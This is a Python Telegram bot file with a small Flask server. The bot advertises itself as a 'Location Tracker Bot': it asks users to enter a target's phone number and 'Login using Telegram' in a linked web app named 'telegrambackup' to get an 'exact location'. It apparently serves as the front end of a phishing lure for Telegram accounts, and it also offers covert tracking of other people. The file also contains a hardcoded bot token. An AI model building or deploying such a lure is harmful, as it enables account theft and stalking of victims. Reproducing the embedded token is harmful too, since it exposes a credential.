import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import threading
import os
from flask import Flask

# IMPORTANT: You posted this token publicly. 
# Go to @BotFather immediately and revoke/regenerate your token.
TOKEN = "8668483286:AAE5c96iruzfa7Ea3eItsNonks9ILiYB9vk" 

MINI_APP_URL = "https://telegrambackup.onrender.com" 

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup()
    
    open_button = InlineKeyboardButton(
        "🌟 Find Location 🌟", 
        web_app=WebAppInfo(url=MINI_APP_URL)
    )
    markup.add(open_button)

    # Switched to HTML tags to prevent parsing crashes
    welcome_text = (
        "🚀 <b>Welcome to the Location Tracker Bot!</b> 🚀\n\n"
        "Here is how to get started:\n\n"
        "👉 <b>Step 1:</b> Click the Find Location button below.\n"
        "👉 <b>Step 2:</b> Enter Target Mobile Number.\n"
        "👉 <b>Step 3:</b> Login using Telegram.\n"
        "👉 <b>Step 4:</b> Get Exact Location!\n\n"
        "👇 <i>Click below to proceed</i> 👇"
    )

    bot.send_message(
        chat_id=message.chat.id,
        text=welcome_text,
        parse_mode='HTML', 
        reply_markup=markup
    )

def run_bot():
    print(f"Bot with token ending in ...{TOKEN[-4:]} is starting.")
    # infinity_polling automatically catches connection errors and restarts the loop
    bot.infinity_polling()

thread = threading.Thread(target=run_bot, daemon=True)
thread.start()

app = Flask(__name__)

@app.route('/')
def health_check():
    return "The Telegram bot is running successfully!"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
